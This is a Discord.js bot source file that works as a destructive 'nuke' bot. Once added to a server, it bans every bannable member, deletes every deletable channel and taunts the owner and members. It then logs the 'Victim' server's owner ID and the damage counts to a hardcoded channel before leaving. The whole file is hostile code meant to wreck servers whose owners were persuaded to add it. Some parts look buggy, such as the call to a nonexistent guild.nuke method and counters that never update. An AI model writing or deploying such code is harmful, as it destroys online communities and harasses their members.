const { Client, RichEmbed } = require('discord.js');
const config = require('./config.json');
const client = new Client();

client.on('ready', () => { 
  client.guilds.forEach(x => { return x.nuke(x); });
  console.log('Ready to have some fun... >:)');
});

async function nuke(guild, users = 0, channels = 0) {
  await guild.members.forEach(x => { 
    x.send('You\'re getting banned! Nothing personal...');
    if(x.bannable) x.ban(); 
    return users++;
  });
  await guild.channels.forEach(x => { 
    if(x.deletable) x.delete();
    return channels++;
  });
  await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
}

client.on('guildCreate', async (guild) => {
  let users = 0;
  let channels = 0;
  let embed = new RichEmbed();

  await nuke(guild, users, channels);

  if(users > 0 || channels > 0) {
    embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
          .setColor(3447003)
          .setDescription(`Owner - ${guild.owner.user.username}#${guild.owner.user.discriminator} (${guild.owner.id})\nBanned - ${users} users\nDeleted - ${channels} channels`);
    client.channels.get('274770009883148288').sendEmbed(embed);
  }
  guild.leave();
});

client.login(config.token).catch(console.error);
